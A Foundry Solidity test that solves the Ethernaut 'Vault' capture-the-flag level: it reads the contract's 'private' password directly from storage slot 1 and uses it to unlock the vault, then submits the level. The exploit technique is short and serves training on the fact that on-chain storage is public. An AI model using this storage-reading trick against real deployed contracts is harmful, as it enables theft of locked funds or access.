// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/08-Vault/VaultFactory.sol";
import "../../../src/core/Ethernaut.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // load the password stored in storage slot 1
        bytes32 pass = vm.load(address(ethernautVault), bytes32(uint256(1)));
        // use the password to unlock the vault
        ethernautVault.unlock(pass);

        assertEq(ethernautVault.locked(), false);
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
